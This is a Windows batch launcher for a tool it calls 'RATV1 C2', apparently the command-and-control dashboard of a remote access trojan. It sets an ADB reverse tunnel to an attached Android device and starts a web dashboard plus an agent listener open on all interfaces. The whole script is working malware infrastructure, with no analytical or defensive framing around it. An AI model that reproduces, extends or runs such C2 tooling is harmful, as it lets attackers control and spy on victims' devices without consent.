@echo off
setlocal
echo.
echo  RATV1 C2 -- starting dashboard
echo.

:: Check for venv
if not exist "venv\Scripts\python.exe" (
    echo  [!] venv not found. Run setup.bat first.
    pause & exit /b 1
)

:: ADB tunnel if device connected
adb version >nul 2>&1
if not errorlevel 1 (
    for /f %%D in ('adb devices ^| findstr /v "List" ^| findstr "device"') do (
        echo  [+] ADB device detected -- setting reverse tunnel...
        adb reverse tcp:8667 tcp:8667 >nul 2>&1
        echo  [+] tunnel: device:8667 -^> localhost:8667
    )
)

echo  [.] Starting C2 dashboard on http://localhost:5006
echo  [.] Agent listener on 0.0.0.0:8667
echo.
venv\Scripts\python.exe c2_web.py %*
